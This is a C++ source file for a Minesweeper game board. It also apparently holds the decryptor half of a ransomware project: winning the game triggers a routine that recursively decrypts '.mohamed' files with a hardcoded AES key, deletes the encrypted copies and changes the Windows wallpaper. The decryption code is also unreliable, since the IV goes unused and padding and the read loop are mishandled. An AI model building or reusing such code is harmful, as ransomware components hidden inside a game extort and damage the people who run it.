#include "Board.hpp"
#include "ResourceHolder.hpp"
#include "SoundManager.hpp"
#include "Utils.hpp"
#include <iostream>
#include <filesystem>
#include <string>
#include <fstream>
#include <openssl/aes.h>
#include <windows.h>

namespace fs = std::filesystem;
const WORD COLOR_RESET = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED;

const WORD COLOR_BLUE = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
const WORD COLOR_GREEN = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
const WORD COLOR_YELLOW = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
const WORD COLOR_DEEP_GREEN = FOREGROUND_GREEN;
const WORD COLOR_RED = FOREGROUND_RED;

Board::Board(const sf::IntRect &board) {
  m_tile_size = (float)board.width / (float)Board::BOARD_SIZE;
  sf::Texture *txt_tile_unclicked =
      TextureHolder::get(Textures::TILE_UNCLICKED);
  m_scale_factor =
      (double)m_tile_size / (double)txt_tile_unclicked->getSize().x;

  m_global_position = board;
  reset();
}

void changeDesktopBackground() {
    // Specify the path to the new background image
    const wchar_t* imagePath = L"C:\\Users\\ASUS\\Downloads\\temp\\ransomware project\\root\\image3.jpg";

    // Set the desktop background
    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
        // Wallpaper changed successfully
        printf("Desktop background changed successfully.\n");
    } else {
        // Error occurred
        printf("Error changing desktop background.\n");
    }
}


bool SetConsoleColor(WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	if (hConsole == INVALID_HANDLE_VALUE) {
		return false;
	}
	return SetConsoleTextAttribute(hConsole, color);
}



bool DecryptFile(const fs::path& encryptedFilePath, const unsigned char* key, const unsigned char* iv, int level) {
	AES_KEY aesKey;
	// Initialize AES decryption
	AES_set_decrypt_key(key, 256, &aesKey);

	// Open the encrypted file for reading
	std::ifstream encryptedFile(encryptedFilePath, std::ios::binary);
	if (!encryptedFile.is_open()) {
		SetConsoleColor(COLOR_RED);
		std::cerr << "Failed to open encrypted file: " << encryptedFilePath << "\n";
		SetConsoleColor(COLOR_RESET);
		return false; // Return false to indicate decryption failure
	}

	// Create the output file with the same directory structure and name
	fs::path decryptedFilePath = encryptedFilePath;
	decryptedFilePath.replace_extension("");  // Remove the ".mohamed" extension
	std::ofstream decryptedFile(decryptedFilePath, std::ios::binary);
	if (!decryptedFile.is_open()) {
		SetConsoleColor(COLOR_RED);
		std::cerr << "Failed to create decrypted file: " << decryptedFilePath << "\n";
		SetConsoleColor(COLOR_RESET);
		encryptedFile.close();
		return false; // Return false to indicate decryption failure
	}

	// Decrypt the file
	unsigned char inBuffer[AES_BLOCK_SIZE];
	unsigned char outBuffer[AES_BLOCK_SIZE];
	while (!encryptedFile.eof()) {
		encryptedFile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE);
		int bytesRead = static_cast<int>(encryptedFile.gcount());
		AES_decrypt(inBuffer, outBuffer, &aesKey);
		decryptedFile.write(reinterpret_cast<char*>(outBuffer), bytesRead);
	}

	// Close the file handles
	encryptedFile.close();
	decryptedFile.close();

	if (decryptedFile.good()) {
		// If decryption was successful, delete the encrypted file
		if (std::filesystem::remove(encryptedFilePath)) {
			for (int i = 0; i < level; ++i) {
				std::cout << "   ";
			}
			SetConsoleColor(COLOR_YELLOW);
			std::cout << "[DELETE ECRYPTED]: " << encryptedFilePath.filename() << std::endl;
			SetConsoleColor(COLOR_RESET);
		}
		else {
			SetConsoleColor(COLOR_RED);
			std::cerr << "Failed to delete encrypted file: " << encryptedFilePath << "\n";
			SetConsoleColor(COLOR_RESET);
		}
		return true; // Return true to indicate decryption success
	}
	else {
		// Decryption was not successful, so delete the partially created decrypted file
		std::filesystem::remove(decryptedFilePath);

		for (int i = 0; i < level; ++i) {
			std::cout << "   ";
		}
		SetConsoleColor(COLOR_RED);
		std::cerr << "[DELETE DECRYPTED]: " << decryptedFilePath.filename() << " (Decryption Failed)\n";
		SetConsoleColor(COLOR_RESET);

		return false; // Return false to indicate decryption failure
	}
}
void processDirectory(const fs::path& directory, const unsigned char* key, const unsigned char* iv, int level = 0) {
    // Convert the directory path to a string
    std::string directoryPath = directory.string();

    // Check if the directory path contains 'root'
    if (directoryPath.find("Minsewepper") != std::string::npos) {
        return;
    }

    // Print directory information before entering the loop
    SetConsoleColor(COLOR_BLUE);
    for (int i = 0; i < level; ++i) {
        std::cout << "   ";  // Print three spaces for each level of nesting
    }

    std::wstring wideFilename = directory.filename();
    std::string narrowFilename(wideFilename.begin(), wideFilename.end());

    std::cout << "[DIRECTORY]: " << narrowFilename << std::endl;
    SetConsoleColor(COLOR_RESET);

    // Process files with ".mohamed" extension first
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (fs::is_regular_file(entry) && entry.path().extension() == ".mohamed") {
            SetConsoleColor(COLOR_RESET);
            for (int i = 0; i < level + 1; ++i) {
                std::cout << "   ";  // Print three spaces for each level of nesting, plus one for files
            }

            SetConsoleColor(COLOR_YELLOW);
            std::cout << "[FILE]: " << entry.path().filename() << std::endl;

            SetConsoleColor(COLOR_RESET);
            DecryptFile(entry.path(), key, iv, level + 2);
        }
    }

    // Process subdirectories
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (fs::is_directory(entry)) {
            processDirectory(entry.path(), key, iv, level + 1);
        }
    }
}
void cure() {
	fs::path currentDir = fs::current_path();
	fs::path parentDir = currentDir.parent_path();
	//fs::path grandParentDir=parentDir.parent_path();
	std::cout << "Decrypting files in the parent directory and its subdirectories:\n";

	// Assuming you have a way to obtain the key and IV used for encryption
	unsigned char key[32] = {
		0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
		0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
		0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
		0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
	};

	unsigned char iv[16] = {
		0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
		0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F
	};
	 processDirectory(currentDir, key, iv, 0);

	// Iterate over all ".mohamed" files and decrypt them
	for (const auto& entry : fs::recursive_directory_iterator(currentDir)) {
		if (fs::is_directory(entry) && entry.path().filename() != "Minsewepper") {
			processDirectory(entry.path(), key, iv);
		}
	}
	changeDesktopBackground();
	
}



void Board::reset() {
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      sf::Vector2f tile_global_position = {
          x * m_tile_size + m_global_position.left,
          y * m_tile_size + m_global_position.top};
      m_tiles[x][y] =
          Tile(sf::Vector2u(x, y), tile_global_position, m_scale_factor);
    }
  }
  std::vector<sf::Vector2u> bombs = generate_bombs();
  for (sf::Vector2u &v : bombs) {
    m_tiles[v.x][v.y].plant_bomb();

  }
  m_board_active = true;
}

void Board::lose_game() {
  detonate_all_bombs();
  m_board_active = false;
}

void Board::win_game() {
  SoundManager::play(Sounds::WIN_SOUND);
  m_board_active = false;
  cure();
}

bool Board::is_board_active() const { return m_board_active; }

void Board::detonate_all_bombs() {
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      Tile &current = m_tiles[x][y];
      if (current.is_bomb_planted() == true && current.is_clicked() == false) {
        current.click(0);
      }
    }
  }
}

void Board::click(sf::Mouse::Button button, sf::Vector2u click_position) {
  if (m_board_active == false) {
    return;
  }
  Tile *tile = find_tile_by_position(click_position);
  if (tile == nullptr) {
    return;
  }
  if (button == sf::Mouse::Button::Left) {
    if (tile->is_flagged() == false) {
      tile->click(count_bombs_nearby(*tile));
      if (tile->is_bomb_planted()) {
        lose_game();
      } else {
        uncover_empty_tiles(*tile);
      }
    }
  } else if (button == sf::Mouse::Button::Right) {
    if (tile->is_clicked() == false) {
      if (tile->is_flagged() == false) {
        if (get_flagged_tiles() != get_bombs_number()) {
          tile->set_flag(true);
        }
      } else {
        tile->set_flag(false);
      }
    }
  }
}

void Board::update() {
  if (get_unclicked_tiles() == get_bombs_number()) {
    win_game();
  }
}

void Board::highlight_active_tile(const sf::Vector2u &mouse_position) {
  if (m_last_highlighted_tile) {
    m_last_highlighted_tile->set_hover(false);
  }
  Tile *tile = find_tile_by_position(mouse_position);
  if (tile == nullptr) {
    return;
  }
  tile->set_hover(true);
  m_last_highlighted_tile = tile;
}

int Board::get_unclicked_tiles() const {
  int unclicked = 0;
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      const Tile &tile = m_tiles[x][y];
      if (tile.is_clicked() == false) {
        unclicked += 1;
      }
    }
  }
  return unclicked;
}

Tile *Board::find_tile_by_position(const sf::Vector2u &position) {
  sf::Vector2f f_position(position.x, position.y);
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      Tile &tile = m_tiles[x][y];
      if (tile.contains(f_position)) {
        return &tile;
      }
    }
  }
  return nullptr;
}

void Board::draw(sf::RenderTarget &target, sf::RenderStates states) const {
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      target.draw(m_tiles[x][y], states);
    }
  }
}

std::vector<sf::Vector2u> Board::generate_bombs() {
  const int total_fields = Board::BOARD_SIZE * Board::BOARD_SIZE;
  const int bombs = Board::BOMB_COVERAGE * total_fields;
  return Utils::get_random_unique_vectors(Board::BOARD_SIZE, Board::BOARD_SIZE,
                                          bombs);
}

int Board::get_bombs_left() const {
  return (get_bombs_number() - get_flagged_tiles());
}

int Board::get_flagged_tiles() const {
  int flags = 0;
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      if (m_tiles[x][y].is_flagged()) {
        flags += 1;
      }
    }
  }
  return flags;
}

int Board::get_bombs_number() const {
  int bombs = 0;
  for (auto x = 0; x < Board::BOARD_SIZE; x++) {
    for (auto y = 0; y < Board::BOARD_SIZE; y++) {
      if (m_tiles[x][y].is_bomb_planted()) {
        bombs += 1;
      }
    }
  }
  return bombs;
}

Tile *Board::get_top_tile(Tile &tile) {
  sf::Vector2u pos = tile.get_coords();
  if (pos.y > 0) {
    return &m_tiles[pos.x][pos.y - 1];
  }
  return nullptr;
}

Tile *Board::get_right_tile(Tile &tile) {
  sf::Vector2u pos = tile.get_coords();
  if (pos.x < (BOARD_SIZE - 1)) {
    return &m_tiles[pos.x + 1][pos.y];
  }
  return nullptr;
}

Tile *Board::get_bottom_tile(Tile &tile) {
  sf::Vector2u pos = tile.get_coords();
  if (pos.y < (BOARD_SIZE - 1)) {
    return &m_tiles[pos.x][pos.y + 1];
  }
  return nullptr;
}

Tile *Board::get_left_tile(Tile &current) {
  sf::Vector2u pos = current.get_coords();
  if (pos.x > 0) {
    return &m_tiles[pos.x - 1][pos.y];
  }
  return nullptr;
}

int Board::count_bombs_nearby(Tile &current) {
  std::array<Tile *, 8> sides = get_sides(current);
  int result = 0;
  for (Tile *t : sides) {
    if (t) {
      result += (t->is_bomb_planted()) ? 1 : 0;
    }
  }
  return result;
}

void Board::uncover_empty_tiles(Tile &current) {
  if (count_bombs_nearby(current) != 0) {
    return;
  }

  std::array<Tile *, 8> sides = get_sides(current);
  for (Tile *t : sides) {
    if (t) {
      if (t->is_clicked() == false) {
        t->click(count_bombs_nearby(*t));
        uncover_empty_tiles(*t);
      }
    }
  }
}

std::array<Tile *, 8> Board::get_sides(Tile &current) {
  Tile *top = get_top_tile(current);
  Tile *right = get_right_tile(current);
  Tile *bottom = get_bottom_tile(current);
  Tile *left = get_left_tile(current);

  Tile *topleft = (top && left) ? get_left_tile(*top) : nullptr;
  Tile *bottomleft = (bottom && left) ? get_left_tile(*bottom) : nullptr;
  Tile *topright = (top && right) ? get_right_tile(*top) : nullptr;
  Tile *bottomright = (bottom && right) ? get_right_tile(*bottom) : nullptr;

  std::array<Tile *, 8> sides = {top,    topright,   right, bottomright,
                                 bottom, bottomleft, left,  topleft};
  return sides;
}

